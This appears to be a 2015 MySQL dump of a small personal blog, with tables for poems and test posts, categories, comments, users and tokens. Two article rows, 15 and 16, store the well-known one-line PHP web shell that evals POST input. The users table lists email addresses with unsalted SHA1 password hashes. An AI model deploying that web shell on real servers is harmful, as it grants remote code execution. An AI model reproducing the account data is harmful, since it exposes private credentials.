/*
Navicat MySQL Data Transfer

Source Server         : wltx
Source Server Version : 50624
Source Host           : localhost:3306
Source Database       : liul

Target Server Type    : MYSQL
Target Server Version : 50624
File Encoding         : 65001

Date: 2015-12-25 20:37:53
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for article
-- ----------------------------
DROP TABLE IF EXISTS `article`;
CREATE TABLE `article` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `cid` int(11) NOT NULL COMMENT '目录ID',
  `like` int(11) DEFAULT '0',
  `updatetime` int(11) NOT NULL,
  `createtime` int(11) NOT NULL,
  `uid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=18 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of article
-- ----------------------------
INSERT INTO `article` VALUES ('1', '钗头凤', '\r\n看不穿，事几番，无花无果无人赏。人未改，物已换，一种离愁，\r\n情何以堪？\r\n乱，乱，乱。\r\n\r\n读不懂，恨情长，错时错地错情感。梦犹存，理未缠，三年将逝，\r\n何去何还？\r\n叹，叹，叹。', '3', '1', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('2', '江城子123455', '<p>老夫聊发少年狂，左牵黄，右擎苍。</p>', '4', '2', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('3', '重大消息', '据知情人士爆料，福建刘勇烽同志今年年底可能要结婚，这对无数少女来说无疑是个毁灭性的打击。', '5', '1', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('4', '薄幸', '姜一郎', '3', '1', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('5', '卜算子', '啦啦啦', '4', '0', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('6', '蝶恋花', '放假不', '5', '1', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('7', '永遇乐', '对方答复', '3', '0', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('8', '临江仙', '对对对', '5', '0', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('9', '念奴娇', '建军节建军节', '5', '0', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('10', '满江红', '大幅度发发发', '5', '0', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('11', '沁园春', '附近就看看', '5', '0', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('12', '虞美人', '雇员春两节课', '5', '0', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('13', '渔家傲', '大幅度发发发', '5', '0', '1446624202', '1446624202', '11');
INSERT INTO `article` VALUES ('14', 'friendlyDate自定义函数', '<p>/*<br/>&nbsp;&nbsp;&nbsp; **友好日期格式化<br/>&nbsp;&nbsp;&nbsp; */<br/>&nbsp;&nbsp;&nbsp; function friendlyDate($sTime, $type = &#39;normal&#39;)<br/>&nbsp;&nbsp;&nbsp; {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //sTime=源时间，cTime=当前时间，dTime=时间差<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $cTime = time();<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $dTime = $cTime - $sTime;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //$dDay = intval(date(&quot;z&quot;, $cTime)) - intval(date(&quot;z&quot;, $sTime));<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $dDay = intval($dTime / 3600 / 24);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $dYear = intval(date(&quot;Y&quot;, $cTime)) - intval(date(&quot;Y&quot;, $sTime));<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //normal：n秒前，n分钟前，n小时前，日期<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($type == &#39;normal&#39;) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($dTime &lt; 60) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $dTime . &quot;秒前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dTime &lt; 3600) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return intval($dTime / 60) . &quot;分钟前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //今天的数据.年份相同.日期相同.<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dYear == 0 &amp;&amp; $dDay == 0) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //return intval($dTime/3600).&quot;小时前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return &#39;今天&#39; . date(&#39;H:i&#39;, $sTime);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dYear == 0) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return date(&quot;m月d日 H:i&quot;, $sTime);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return date(&quot;Y-m-d H:i&quot;, $sTime);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($type == &#39;mohu&#39;) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($dTime &lt; 60) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $dTime . &quot;秒前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dTime &lt; 3600) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return intval($dTime / 60) . &quot;分钟前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dTime &gt;= 3600 &amp;&amp; $dDay == 0) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return intval($dTime / 3600) . &quot;小时前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dDay &gt; 0 &amp;&amp; $dDay &lt;= 7) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return intval($dDay) . &quot;天前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dDay &gt; 7 &amp;&amp; $dDay &lt;= 30) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return intval($dDay / 7) . &#39;周前&#39;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dDay &gt; 30) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return intval($dDay / 30) . &#39;个月前&#39;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //full: Y-m-d , H:i:s<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($type == &#39;full&#39;) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return date(&quot;Y-m-d , H:i:s&quot;, $sTime);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($type == &#39;ymd&#39;) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return date(&quot;Y-m-d&quot;, $sTime);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($dTime &lt; 60) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $dTime . &quot;秒前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dTime &lt; 3600) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return intval($dTime / 60) . &quot;分钟前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dTime &gt;= 3600 &amp;&amp; $dDay == 0) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return intval($dTime / 3600) . &quot;小时前&quot;;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } elseif ($dYear == 0) {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return date(&quot;Y-m-d H:i:s&quot;, $sTime);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return date(&quot;Y-m-d H:i:s&quot;, $sTime);<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br/>&nbsp;&nbsp;&nbsp; }</p>', '3', '0', '1449488116', '1449488116', '11');
INSERT INTO `article` VALUES ('15', '一句话木马', '<p><span style=\"line-height: 22.8571px; white-space: normal;\">&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span></p>', '3', '0', '1449650090', '1449645594', '11');
INSERT INTO `article` VALUES ('16', '一句话 木马', '<p>&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;<br/></p>', '3', '0', '1449646927', '1449646927', '11');
INSERT INTO `article` VALUES ('17', '三大代表', '<p>三大代表</p>', '9', '0', '1449804398', '1449804398', '2');

-- ----------------------------
-- Table structure for category
-- ----------------------------
DROP TABLE IF EXISTS `category`;
CREATE TABLE `category` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `amount` int(11) NOT NULL DEFAULT '0',
  `cid` int(11) NOT NULL DEFAULT '0',
  `uid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of category
-- ----------------------------
INSERT INTO `category` VALUES ('1', '工作笔记', '0', '0', '11');
INSERT INTO `category` VALUES ('2', '随缘诗文', '0', '0', '11');
INSERT INTO `category` VALUES ('3', 'php', '0', '1', '11');
INSERT INTO `category` VALUES ('4', 'java', '0', '1', '11');
INSERT INTO `category` VALUES ('5', '别问是劫还是缘', '0', '2', '11');
INSERT INTO `category` VALUES ('7', '幽默生活', '0', '0', '11');
INSERT INTO `category` VALUES ('8', '梦想剧场', '0', '0', '2');
INSERT INTO `category` VALUES ('9', '社会主义核心价值观', '0', '8', '2');

-- ----------------------------
-- Table structure for comment
-- ----------------------------
DROP TABLE IF EXISTS `comment`;
CREATE TABLE `comment` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `content` text COMMENT '内容',
  `createtime` int(11) DEFAULT NULL,
  `updatetime` int(11) DEFAULT NULL,
  `uid` int(11) DEFAULT NULL COMMENT '用户id',
  `rid` int(11) DEFAULT '0' COMMENT '回复评论id(父id)',
  `aid` int(11) DEFAULT NULL COMMENT '文章id',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of comment
-- ----------------------------
INSERT INTO `comment` VALUES ('1', '陆游真才子也', '1450165610', '1450165610', '1', '0', '1');
INSERT INTO `comment` VALUES ('2', '陆游你很帅', null, null, null, '0', '1');
INSERT INTO `comment` VALUES ('3', '陆游很帅', null, null, null, '0', '1');
INSERT INTO `comment` VALUES ('4', '陆游很帅!', '1450264943', '1450264943', null, '0', '1');
INSERT INTO `comment` VALUES ('5', '陆游很帅！！！', '1450264991', '1450264991', '1', '0', '1');
INSERT INTO `comment` VALUES ('6', '不好意思，我很秀', '1450265006', '1450265006', '1', '0', '1');
INSERT INTO `comment` VALUES ('7', '帅成马', '1450265029', '1450265029', '1', '0', '6');
INSERT INTO `comment` VALUES ('8', '靠，好吊啊', '1450318084', '1450318084', '1', '0', '3');
INSERT INTO `comment` VALUES ('9', '大勇好秀啊', '1450318105', '1450318105', '1', '0', '3');
INSERT INTO `comment` VALUES ('10', '1111', '1450323764', '1450323764', '1', '0', '4');
INSERT INTO `comment` VALUES ('11', 'guoji', '1450345176', '1450345176', '1', '0', '4');
INSERT INTO `comment` VALUES ('12', '111', '1450861219', '1450861219', '11', '0', '2');
INSERT INTO `comment` VALUES ('13', '123', '1450861395', '1450861395', '2', '0', '2');
INSERT INTO `comment` VALUES ('14', '132', '1450861614', '1450861614', '2', '0', '2');
INSERT INTO `comment` VALUES ('15', '大勇这有点爽啊', '1450862972', '1450862972', '2', '0', '3');
INSERT INTO `comment` VALUES ('16', '大勇爽成麻', '1450863082', '1450863082', '4', '0', '3');
INSERT INTO `comment` VALUES ('17', '123', '1451035780', '1451035780', '11', '0', '3');
INSERT INTO `comment` VALUES ('18', '我就是要结婚，你想怎么地吧', '1451035813', '1451035813', '11', '0', '3');
INSERT INTO `comment` VALUES ('19', '111', '1451042228', '1451042228', '11', '0', '5');
INSERT INTO `comment` VALUES ('20', '我很秀', '1451042238', '1451042238', '11', '0', '5');

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `code` varchar(255) DEFAULT NULL,
  `headimg` varchar(255) DEFAULT NULL,
  `name` varchar(255) DEFAULT NULL,
  `is_active` tinyint(1) DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=44 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of users
-- ----------------------------
INSERT INTO `users` VALUES ('2', '1903913941@qq.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', null, '/img/headimg/15.png', '占鑫', '1');
INSERT INTO `users` VALUES ('3', '1903913943@qq.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', null, null, 'wendao', '1');
INSERT INTO `users` VALUES ('4', '1903913944@qq.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', null, '/img/headimg/5.png', '赖辉', '1');
INSERT INTO `users` VALUES ('11', '1903913942@qq.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', null, '/img/headimg/5.png', '大勇', '1');
INSERT INTO `users` VALUES ('43', 'jxlgll@126.com', '7c4a8d09ca3762af61e59520943dc26494f8941b', null, '/img/headimg/12.png', '123456', '1');

-- ----------------------------
-- Table structure for users_token
-- ----------------------------
DROP TABLE IF EXISTS `users_token`;
CREATE TABLE `users_token` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) DEFAULT NULL,
  `token` varchar(255) DEFAULT NULL,
  `type` tinyint(1) DEFAULT NULL,
  `createtime` int(11) DEFAULT NULL,
  `status` tinyint(1) DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=35 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of users_token
-- ----------------------------
INSERT INTO `users_token` VALUES ('27', '35', '229c1fcebf2689fbfdcdf854e09f26a8515b92ae', '1', '1450851214', '1');
INSERT INTO `users_token` VALUES ('28', '37', 'f220680eeb9636f104dfacf26fbc189da4d52e47', '1', '1450855296', '0');
INSERT INTO `users_token` VALUES ('29', '38', 'aa906332a50ac27001fc16de32e30f9bcce95427', '1', '1450855796', '1');
INSERT INTO `users_token` VALUES ('30', '39', '62fa8a33504246a0b4def3e468da8db28d284d62', '1', '1450858008', '1');
INSERT INTO `users_token` VALUES ('31', '40', 'ad2eeea864afb1198e51f507ac34e3041b8fbaa1', '1', '1450858184', '0');
INSERT INTO `users_token` VALUES ('32', '41', 'c0b87c3831aed773b779fe042c459db1f8ec6b11', '1', '1450858487', '0');
INSERT INTO `users_token` VALUES ('33', '42', '62bb22da0f5f411716b0a7b49c4412acbe2526bf', '1', '1450858718', '0');
INSERT INTO `users_token` VALUES ('34', '43', '49e7bd87eb29e615dee943049861b33dca06b564', '1', '1450859106', '0');

-- ----------------------------
-- Procedure structure for alw
-- ----------------------------
DROP PROCEDURE IF EXISTS `alw`;
DELIMITER ;;
CREATE DEFINER=`root`@`localhost` PROCEDURE `alw`(IN `_id` int)
BEGIN
	 SELECT * FROM article WHERE id=_id;
END
;;
DELIMITER ;

-- ----------------------------
-- Procedure structure for fhh
-- ----------------------------
DROP PROCEDURE IF EXISTS `fhh`;
DELIMITER ;;
CREATE DEFINER=`root`@`localhost` PROCEDURE `fhh`()
BEGIN
	SELECT * FROM article;
	SELECT * FROM category;
END
;;
DELIMITER ;
